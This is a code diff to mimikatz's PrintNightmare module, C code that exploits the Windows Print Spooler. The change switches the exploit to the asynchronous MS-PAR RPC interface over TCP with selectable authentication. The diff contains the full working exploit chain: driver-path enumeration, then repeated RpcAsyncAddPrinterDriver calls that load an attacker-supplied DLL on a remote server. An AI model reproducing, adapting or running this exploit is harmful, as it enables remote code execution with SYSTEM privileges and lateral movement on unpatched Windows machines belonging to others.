@@ -1403,7 +1403,9 @@ NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 {
-	LPCWSTR szRemote, szLibrary, szTry, szShortLibrary;
+	RPC_BINDING_HANDLE hBinding;
+	RPC_STATUS rpcStatus;
+	LPCWSTR szRemote, szService, szLibrary, szTry, szShortLibrary;
 	LPWSTR szSystem32, szDriver, szKernelBase, szDriverPath;
 	DRIVER_INFO_2 DriverInfo = {3, L"QMS 810",
 #if defined(_M_X64) || defined(_M_ARM64)
@@ -1412,7 +1414,8 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	L"Windows x86"
 #endif
 	, NULL, NULL, NULL};
-	DWORD limit, i;
+	DWORD AuthnSvc, limit, i;
+	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
 
 	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
 	{
@@ -1423,48 +1426,57 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 			{
 				szShortLibrary++;
 				kprintf(L"| Remote    : %s\n", szRemote);
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, L"\\pipe\\spoolss", L"spooler", TRUE, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_IMP_LEVEL_DELEGATE, &hSpoolHandle, NULL))
+
+				kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"host", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szRemote, NULL, szService, TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hBinding, NULL))
 				{
-					if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(DriverInfo.pEnvironment, &szSystem32, &szDriver))
+					rpcStatus = RpcBindingSetObject(hBinding, (UUID *) &PAR_ObjectUUID);
+					if(rpcStatus == RPC_S_OK)
 					{
-						if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
+						if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(hBinding, DriverInfo.pEnvironment, &szSystem32, &szDriver))
 						{
-							kprintf(L"* KernelBase: %s\n", szKernelBase);
-							if(kull_m_string_sprintf(&szDriverPath, L"%sunidrv.dll", szDriver))
+							if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
 							{
-								DriverInfo.pDriverPath = szDriverPath;
-								DriverInfo.pDataFile = (LPWSTR) szLibrary;
-								kprintf(L"* DriverPath: %s\n", DriverInfo.pDriverPath);
-								kprintf(L"| DataFile  : %s (%s)\n", DriverInfo.pDataFile, szShortLibrary);
-								if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(szSystem32, &DriverInfo, 0, szKernelBase) == ERROR_SUCCESS)
+								kprintf(L"* KernelBase: %s\n", szKernelBase);
+								if(kull_m_string_sprintf(&szDriverPath, L"%sunidrv.dll", szDriver))
 								{
-									if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(szSystem32, &DriverInfo, 0, szKernelBase) == ERROR_SUCCESS)
+									DriverInfo.pDriverPath = szDriverPath;
+									DriverInfo.pDataFile = (LPWSTR) szLibrary;
+									kprintf(L"* DriverPath: %s\n", DriverInfo.pDriverPath);
+									kprintf(L"| DataFile  : %s (%s)\n", DriverInfo.pDataFile, szShortLibrary);
+
+									if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, szSystem32, &DriverInfo, 0, szKernelBase) == ERROR_SUCCESS)
 									{
-										if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(szSystem32, &DriverInfo, 2, szShortLibrary) != ERROR_SUCCESS)
+										if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, szSystem32, &DriverInfo, 0, szKernelBase) == ERROR_SUCCESS)
 										{
-											if(kull_m_string_args_byName(argc, argv, L"try", &szTry, NULL))
+											if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, szSystem32, &DriverInfo, 2, szShortLibrary) != ERROR_SUCCESS)
 											{
-												limit = wcstoul(szTry, NULL, 0);
-												kprintf(L" | Trying    : 3 to %u\n", limit);
-												for(i = 3; i <= limit; i++)
+												if(kull_m_string_args_byName(argc, argv, L"try", &szTry, NULL))
 												{
-													if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(szSystem32, &DriverInfo, i, szShortLibrary) == ERROR_SUCCESS)
+													limit = wcstoul(szTry, NULL, 0);
+													kprintf(L" | Trying    : 3 to %u\n", limit);
+													for(i = 3; i <= limit; i++)
 													{
-														break;
+														if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, szSystem32, &DriverInfo, i, szShortLibrary) == ERROR_SUCCESS)
+														{
+															break;
+														}
 													}
 												}
 											}
 										}
 									}
+									LocalFree(szDriverPath);
 								}
-								LocalFree(szDriverPath);
+								LocalFree(szKernelBase);
 							}
-							LocalFree(szKernelBase);
+							LocalFree(szSystem32);
+							LocalFree(szDriver);
 						}
-						LocalFree(szSystem32);
-						LocalFree(szDriver);
 					}
-					kull_m_rpc_deleteBinding(&hSpoolHandle);
+					else PRINT_ERROR(L"RpcBindingSetObject: 0x%08x (%u)\n", rpcStatus, rpcStatus);
+
+					kull_m_rpc_deleteBinding(&hBinding);
 				}
 			}
 			else PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", szLibrary);
@@ -1476,7 +1488,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
+BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(handle_t hRemoteBinding, LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
 {
 	BOOL status = FALSE;
 	DWORD ret, i, cbNeeded = 0, cReturned = 0;
@@ -1487,13 +1499,13 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(LPCWSTR szEn
 	{
 		RpcTryExcept
 		{
-			ret = RpcEnumPrinterDrivers(NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, &cReturned);
+			ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, &cReturned);
 			if(ret == ERROR_INSUFFICIENT_BUFFER)
 			{
 				pDriverInfo = (_PDRIVER_INFO_2) LocalAlloc(LPTR, cbNeeded);
 				if(pDriverInfo)
 				{
-					ret = RpcEnumPrinterDrivers(NULL, (wchar_t *) szEnvironment, 2, (BYTE *) pDriverInfo, cbNeeded, &cbNeeded, &cReturned);
+					ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, (BYTE *) pDriverInfo, cbNeeded, &cbNeeded, &cReturned);
 					if(ret == ERROR_SUCCESS)
 					{
 						for(i = 0; (i < cReturned) && !status; i++)
@@ -1535,7 +1547,7 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(LPCWSTR szEn
 	return status;
 }
 
-DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(LPCWSTR szSystem32, PDRIVER_INFO_2 pInfo2, DWORD dwStep, LPCWSTR pConfigFile)
+DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(handle_t hRemoteBinding, LPCWSTR szSystem32, PDRIVER_INFO_2 pInfo2, DWORD dwStep, LPCWSTR pConfigFile)
 {
 	DWORD ret;
 	DRIVER_CONTAINER container_info;
@@ -1567,7 +1579,7 @@ DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(LPCWSTR szSystem32, PDRI
 	kprintf(L"> ConfigFile: %s - ", pInfo2->pConfigFile);
 	RpcTryExcept
 	{
-		ret = RpcAddPrinterDriverEx(NULL, &container_info, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | 0x8000); // APD_INSTALL_WARNED_DRIVER
+		ret = RpcAsyncAddPrinterDriver(hRemoteBinding, NULL, &container_info, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | 0x8000); // APD_INSTALL_WARNED_DRIVER
 		if (ret == ERROR_SUCCESS)
 		{
 			kprintf(L"OK!\n");
